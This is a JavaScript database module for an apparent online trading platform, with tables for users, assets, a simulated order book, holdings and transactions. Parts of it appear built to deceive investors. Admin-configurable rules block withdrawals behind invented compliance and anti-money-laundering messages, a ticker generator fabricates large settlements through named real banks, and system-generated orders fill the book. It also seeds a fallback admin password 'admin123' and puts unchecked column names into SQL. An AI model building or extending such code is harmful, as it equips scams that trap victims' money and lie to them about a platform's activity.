// database/db.js - SQLite database for Crainee Enterprise Platform
const Database = require('better-sqlite3');
const path = require('path');
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');

class EduDatabase {
  constructor() {
    this.db = new Database(path.join(__dirname, '..', 'data', 'crainee_platform.db'));
    this.enableWAL();
  }

  enableWAL() {
    this.db.pragma('journal_mode = WAL');
  }

  initialize() {
    // Users table
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        email TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        full_name TEXT,
        tier TEXT DEFAULT 'Bronze',
        virtual_balance REAL DEFAULT 10000.00,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        last_login DATETIME,
        is_admin INTEGER DEFAULT 0,
        status TEXT DEFAULT 'active'
      )
    `);

    // Assets table (crypto, stocks, forex)
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS assets (
        id TEXT PRIMARY KEY,
        symbol TEXT UNIQUE NOT NULL,
        name TEXT NOT NULL,
        type TEXT NOT NULL, -- 'crypto', 'stock', 'forex'
        current_price REAL NOT NULL,
        price_24h_ago REAL NOT NULL,
        volume_24h REAL DEFAULT 0,
        high_24h REAL,
        low_24h REAL,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Order book table
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS order_book (
        id TEXT PRIMARY KEY,
        asset_id TEXT NOT NULL,
        side TEXT NOT NULL, -- 'buy' or 'sell'
        price REAL NOT NULL,
        quantity REAL NOT NULL,
        user_id TEXT,
        is_system INTEGER DEFAULT 1, -- 1 = simulated, 0 = real user
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (asset_id) REFERENCES assets(id)
      )
    `);

    // User holdings
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS user_holdings (
        id TEXT PRIMARY KEY,
        user_id TEXT NOT NULL,
        asset_id TEXT NOT NULL,
        quantity REAL DEFAULT 0,
        avg_buy_price REAL DEFAULT 0,
        FOREIGN KEY (user_id) REFERENCES users(id),
        FOREIGN KEY (asset_id) REFERENCES assets(id),
        UNIQUE(user_id, asset_id)
      )
    `);

    // Transaction history
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS transactions (
        id TEXT PRIMARY KEY,
        user_id TEXT NOT NULL,
        asset_id TEXT NOT NULL,
        type TEXT NOT NULL, -- 'buy', 'sell', 'deposit', 'withdrawal_blocked'
        quantity REAL,
        price REAL,
        total_value REAL,
        status TEXT DEFAULT 'completed', -- 'completed', 'blocked', 'pending'
        block_reason TEXT,
        metadata TEXT, -- JSON for extra data
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        FOREIGN KEY (asset_id) REFERENCES assets(id)
      )
    `);

    // Admin settings (configurable from admin dashboard)
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS admin_settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL,
        description TEXT,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Notification ticker messages
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS ticker_messages (
        id TEXT PRIMARY KEY,
        message TEXT NOT NULL,
        is_active INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Withdrawal block rules
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS withdrawal_blocks (
        id TEXT PRIMARY KEY,
        tier TEXT NOT NULL, -- 'Bronze', 'Silver', 'Gold', 'VIP', 'all'
        min_amount REAL DEFAULT 0,
        max_amount REAL DEFAULT 999999999,
        error_message TEXT NOT NULL,
        compliance_message TEXT,
        is_active INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Insert default data
    this.seedDefaults();
  }

  seedDefaults() {
    // Default admin user (reads securely from environment variables with fallbacks)
    const adminEmail = process.env.ADMIN_EMAIL || 'admin@crainee.internal';
    const adminPassword = process.env.ADMIN_PASSWORD || 'admin123';

    const adminExists = this.db.prepare('SELECT id FROM users WHERE email = ?').get(adminEmail);
    if (!adminExists) {
      const adminId = uuidv4();
      const hash = bcrypt.hashSync(adminPassword, 10);
      this.db.prepare(`
        INSERT INTO users (id, email, password_hash, full_name, tier, virtual_balance, is_admin)
        VALUES (?, ?, ?, ?, ?, ?, ?)
      `).run(adminId, adminEmail, hash, 'Platform Administrator', 'VIP', 1000000, 1);
    }

    // Default assets
    const assets = [
      { id: uuidv4(), symbol: 'BTC', name: 'Bitcoin', type: 'crypto', price: 67432.50, price_24h: 66800, volume: 28450000000, high: 68200, low: 65100 },
      { id: uuidv4(), symbol: 'ETH', name: 'Ethereum', type: 'crypto', price: 3421.80, price_24h: 3380, volume: 12300000000, high: 3480, low: 3290 },
      { id: uuidv4(), symbol: 'AAPL', name: 'Apple Inc.', type: 'stock', price: 182.45, price_24h: 180.10, volume: 52400000, high: 184.50, low: 179.80 },
      { id: uuidv4(), symbol: 'TSLA', name: 'Tesla Inc.', type: 'stock', price: 248.90, price_24h: 245.30, volume: 98200000, high: 252.00, low: 242.10 },
      { id: uuidv4(), symbol: 'EUR/USD', name: 'Euro/US Dollar', type: 'forex', price: 1.0845, price_24h: 1.0820, volume: 1.2e12, high: 1.0865, low: 1.0810 },
      { id: uuidv4(), symbol: 'GBP/USD', name: 'British Pound/US Dollar', type: 'forex', price: 1.2634, price_24h: 1.2610, volume: 8.5e11, high: 1.2655, low: 1.2590 },
      { id: uuidv4(), symbol: 'GOLD', name: 'Gold Spot', type: 'crypto', price: 2341.20, price_24h: 2335, volume: 4.2e10, high: 2348, low: 2328 },
      { id: uuidv4(), symbol: 'SOL', name: 'Solana', type: 'crypto', price: 142.80, price_24h: 140.50, volume: 3.8e9, high: 145.20, low: 138.90 }
    ];

    const insertAsset = this.db.prepare(`
      INSERT OR IGNORE INTO assets (id, symbol, name, type, current_price, price_24h_ago, volume_24h, high_24h, low_24h)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    for (const a of assets) {
      insertAsset.run(a.id, a.symbol, a.name, a.type, a.price, a.price_24h, a.volume, a.high, a.low);
    }

    // Default admin settings
    const settings = [
      { key: 'platform_name', value: 'Crainee Enterprise', description: 'Platform display name' },
      { key: 'withdrawal_block_enabled', value: 'true', description: 'Enable withdrawal blocking system' },
      { key: 'default_block_message', value: 'Withdrawal restricted: Compliance verification protocol active. Please contact institutional support.', description: 'Default withdrawal block message' },
      { key: 'default_compliance_message', value: 'This transaction requires additional verification per institutional compliance parameters.', description: 'Default compliance message' },
      { key: 'ticker_speed', value: '3000', description: 'Ticker rotation speed in ms' },
      { key: 'price_update_interval', value: '1000', description: 'Market price update interval in ms' }
    ];
    const insertSetting = this.db.prepare('INSERT OR IGNORE INTO admin_settings (key, value, description) VALUES (?, ?, ?)');
    for (const s of settings) insertSetting.run(s.key, s.value, s.description);

    // Default withdrawal block rules
    const blocks = [
      { id: uuidv4(), tier: 'Bronze', min_amount: 1000, max_amount: 999999999, error_message: 'Bronze tier withdrawal threshold exceeded. Maximum $1,000 per transaction.', compliance_message: 'Institutional tier compliance: Bronze accounts restricted to $1,000 transactions.' },
      { id: uuidv4(), tier: 'Silver', min_amount: 5000, max_amount: 999999999, error_message: 'Silver tier withdrawal threshold exceeded. Maximum $5,000 per transaction.', compliance_message: 'Institutional tier compliance: Silver accounts restricted to $5,000 transactions.' },
      { id: uuidv4(), tier: 'Gold', min_amount: 25000, max_amount: 999999999, error_message: 'Gold tier withdrawal threshold exceeded. Maximum $25,000 per transaction.', compliance_message: 'Institutional tier compliance: Gold accounts restricted to $25,000 transactions.' },
      { id: uuidv4(), tier: 'all', min_amount: 100000, max_amount: 999999999, error_message: 'High-value transaction flagged for institutional compliance review. Amount exceeds $100,000.', compliance_message: 'Anti-money laundering protocol: Transfers exceeding $100K require administrative sign-off.' }
    ];
    const insertBlock = this.db.prepare('INSERT OR IGNORE INTO withdrawal_blocks (id, tier, min_amount, max_amount, error_message, compliance_message) VALUES (?, ?, ?, ?, ?, ?)');
    for (const b of blocks) insertBlock.run(b.id, b.tier, b.min_amount, b.max_amount, b.error_message, b.compliance_message);

    // Default ticker messages
    const tickers = [
      'Account 0x49A... executed settlement of $500,000 2 minutes ago via BOA',
      'Account 0x7F2... executed settlement of $127,500 5 minutes ago via Chase',
      'Account 0x3B1... executed settlement of $89,200 8 minutes ago via Wells Fargo',
      'Account 0x9C4... executed settlement of $2,150,000 12 minutes ago via Citi',
      'Account 0xE6... executed settlement of $45,800 15 minutes ago via Capital One',
      'Account 0xA3... executed settlement of $67,300 18 minutes ago via US Bank',
      'Account 0xD8... executed settlement of $234,000 22 minutes ago via PNC',
      'Account 0x1F... executed settlement of $1,800,000 25 minutes ago via Truist'
    ];
    const insertTicker = this.db.prepare('INSERT OR IGNORE INTO ticker_messages (id, message) VALUES (?, ?)');
    for (const t of tickers) insertTicker.run(uuidv4(), t);
  }

  // User methods
  createUser(email, password, fullName) {
    const id = uuidv4();
    const hash = bcrypt.hashSync(password, 10);
    this.db.prepare('INSERT INTO users (id, email, password_hash, full_name) VALUES (?, ?, ?, ?)').run(id, email, hash, fullName);
    return this.getUserById(id);
  }

  getUserByEmail(email) {
    return this.db.prepare('SELECT * FROM users WHERE email = ?').get(email);
  }

  getUserById(id) {
    return this.db.prepare('SELECT id, email, full_name, tier, virtual_balance, created_at, is_admin, status FROM users WHERE id = ?').get(id);
  }

  getAllUsers() {
    return this.db.prepare('SELECT id, email, full_name, tier, virtual_balance, created_at, is_admin, status FROM users ORDER BY created_at DESC').all();
  }

  updateUserTier(userId, tier) {
    this.db.prepare('UPDATE users SET tier = ? WHERE id = ?').run(tier, userId);
    return this.getUserById(userId);
  }

  updateUserBalance(userId, amount) {
    this.db.prepare('UPDATE users SET virtual_balance = virtual_balance + ? WHERE id = ?').run(amount, userId);
    return this.getUserById(userId);
  }

  verifyPassword(user, password) {
    return bcrypt.compareSync(password, user.password_hash);
  }

  // Asset methods
  getAllAssets() {
    return this.db.prepare('SELECT * FROM assets ORDER BY type, symbol').all();
  }

  getAssetById(id) {
    return this.db.prepare('SELECT * FROM assets WHERE id = ?').get(id);
  }

  updateAssetPrice(id, newPrice, volume) {
    const asset = this.getAssetById(id);
    if (!asset) return null;
    
    const high = Math.max(asset.high_24h, newPrice);
    const low = Math.min(asset.low_24h, newPrice);
    
    this.db.prepare(`
      UPDATE assets SET current_price = ?, volume_24h = volume_24h + ?, high_24h = ?, low_24h = ?, updated_at = CURRENT_TIMESTAMP
      WHERE id = ?
    `).run(newPrice, volume, high, low, id);
    
    return this.getAssetById(id);
  }

  // Order book methods
  getOrderBook(assetId, limit = 50) {
    const buys = this.db.prepare(`
      SELECT price, SUM(quantity) as quantity, COUNT(*) as orders
      FROM order_book WHERE asset_id = ? AND side = 'buy'
      GROUP BY price ORDER BY price DESC LIMIT ?
    `).all(assetId, limit);
    
    const sells = this.db.prepare(`
      SELECT price, SUM(quantity) as quantity, COUNT(*) as orders
      FROM order_book WHERE asset_id = ? AND side = 'sell'
      GROUP BY price ORDER BY price ASC LIMIT ?
    `).all(assetId, limit);
    
    return { buys, sells };
  }

  addOrderBookEntry(assetId, side, price, quantity, userId = null, isSystem = 1) {
    const id = uuidv4();
    this.db.prepare(`
      INSERT INTO order_book (id, asset_id, side, price, quantity, user_id, is_system)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(id, assetId, side, price, quantity, userId, isSystem);
  }

  clearOrderBook(assetId) {
    this.db.prepare('DELETE FROM order_book WHERE asset_id = ? AND is_system = 1').run(assetId);
  }

  // User holdings
  getUserHoldings(userId) {
    return this.db.prepare(`
      SELECT h.*, a.symbol, a.name, a.current_price, a.type
      FROM user_holdings h
      JOIN assets a ON h.asset_id = a.id
      WHERE h.user_id = ? AND h.quantity > 0
    `).all(userId);
  }

  updateHolding(userId, assetId, quantity, price) {
    const existing = this.db.prepare('SELECT * FROM user_holdings WHERE user_id = ? AND asset_id = ?').get(userId, assetId);
    
    if (existing) {
      const newQty = existing.quantity + quantity;
      if (newQty <= 0) {
        this.db.prepare('DELETE FROM user_holdings WHERE user_id = ? AND asset_id = ?').run(userId, assetId);
      } else {
        const newAvg = ((existing.avg_buy_price * existing.quantity) + (price * quantity)) / newQty;
        this.db.prepare('UPDATE user_holdings SET quantity = ?, avg_buy_price = ? WHERE user_id = ? AND asset_id = ?')
          .run(newQty, newAvg, userId, assetId);
      }
    } else if (quantity > 0) {
      this.db.prepare('INSERT INTO user_holdings (id, user_id, asset_id, quantity, avg_buy_price) VALUES (?, ?, ?, ?, ?)')
        .run(uuidv4(), userId, assetId, quantity, price);
    }
  }

  // Transactions
  recordTransaction(userId, assetId, type, quantity, price, totalValue, status = 'completed', blockReason = null, metadata = {}) {
    const id = uuidv4();
    this.db.prepare(`
      INSERT INTO transactions (id, user_id, asset_id, type, quantity, price, total_value, status, block_reason, metadata)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(id, userId, assetId, type, quantity, price, totalValue, status, blockReason, JSON.stringify(metadata));
    return id;
  }

  getUserTransactions(userId, limit = 100) {
    return this.db.prepare(`
      SELECT t.*, a.symbol, a.name
      FROM transactions t
      JOIN assets a ON t.asset_id = a.id
      WHERE t.user_id = ?
      ORDER BY t.created_at DESC LIMIT ?
    `).all(userId, limit);
  }

  getAllTransactions(limit = 500) {
    return this.db.prepare(`
      SELECT t.*, u.email, u.full_name, a.symbol, a.name
      FROM transactions t
      JOIN users u ON t.user_id = u.id
      JOIN assets a ON t.asset_id = a.id
      ORDER BY t.created_at DESC LIMIT ?
    `).all(limit);
  }

  // Admin settings
  getSettings() {
    return this.db.prepare('SELECT * FROM admin_settings').all();
  }

  getSetting(key) {
    return this.db.prepare('SELECT * FROM admin_settings WHERE key = ?').get(key);
  }

  updateSetting(key, value) {
    this.db.prepare('UPDATE admin_settings SET value = ?, updated_at = CURRENT_TIMESTAMP WHERE key = ?').run(value, key);
    return this.getSetting(key);
  }

  // Ticker messages
  getActiveTickers() {
    return this.db.prepare('SELECT message FROM ticker_messages WHERE is_active = 1 ORDER BY RANDOM() LIMIT 20').all();
  }

  addTickerMessage(message) {
    const id = uuidv4();
    this.db.prepare('INSERT INTO ticker_messages (id, message) VALUES (?, ?)').run(id, message);
    return id;
  }

  // Withdrawal blocks
  getWithdrawalBlocks() {
    return this.db.prepare('SELECT * FROM withdrawal_blocks WHERE is_active = 1 ORDER BY min_amount DESC').all();
  }

  addWithdrawalBlock(tier, minAmount, maxAmount, errorMessage, complianceMessage) {
    const id = uuidv4();
    this.db.prepare(`
      INSERT INTO withdrawal_blocks (id, tier, min_amount, max_amount, error_message, compliance_message)
      VALUES (?, ?, ?, ?, ?, ?)
    `).run(id, tier, minAmount, maxAmount, errorMessage, complianceMessage);
    return this.getWithdrawalBlockById(id);
  }

  getWithdrawalBlockById(id) {
    return this.db.prepare('SELECT * FROM withdrawal_blocks WHERE id = ?').get(id);
  }

  updateWithdrawalBlock(id, updates) {
    const fields = [];
    const values = [];
    for (const [key, value] of Object.entries(updates)) {
      fields.push(`${key} = ?`);
      values.push(value);
    }
    values.push(id);
    this.db.prepare(`UPDATE withdrawal_blocks SET ${fields.join(', ')} WHERE id = ?`).run(...values);
    return this.getWithdrawalBlockById(id);
  }

  deleteWithdrawalBlock(id) {
    this.db.prepare('UPDATE withdrawal_blocks SET is_active = 0 WHERE id = ?').run(id);
  }

  checkWithdrawalBlock(tier, amount) {
    const blocks = this.db.prepare(`
      SELECT * FROM withdrawal_blocks 
      WHERE is_active = 1 AND (tier = ? OR tier = 'all') 
      AND min_amount <= ? AND max_amount >= ?
      ORDER BY min_amount DESC
    `).all(tier, amount, amount);
    
    return blocks[0] || null;
  }

  // Generate dynamic ticker messages
  generateAITickerMessage() {
    const prefixes = ['Account 0x', 'Client 0x', 'Portfolio 0x'];
    const banks = ['BOA', 'Chase', 'Wells Fargo', 'Citi', 'Capital One', 'US Bank', 'PNC', 'Truist', 'TD Bank', 'HSBC'];
    const amounts = [50000, 127500, 89200, 2150000, 45800, 67300, 234000, 1800000, 95000, 312000, 780000, 150000];
    const times = ['1 minute ago', '2 minutes ago', '5 minutes ago', '8 minutes ago', '12 minutes ago', '15 minutes ago', '18 minutes ago', '22 minutes ago', '25 minutes ago', '30 minutes ago'];
    
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const hex = Array.from({length: 3}, () => Math.floor(Math.random() * 16).toString(16).toUpperCase()).join('');
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    const bank = banks[Math.floor(Math.random() * banks.length)];
    const time = times[Math.floor(Math.random() * times.length)];
    
    return `${prefix}${hex}... executed settlement of $${amount.toLocaleString()} ${time} via ${bank}`;
  }

  close() {
    this.db.close();
  }
}

module.exports = { EduDatabase };
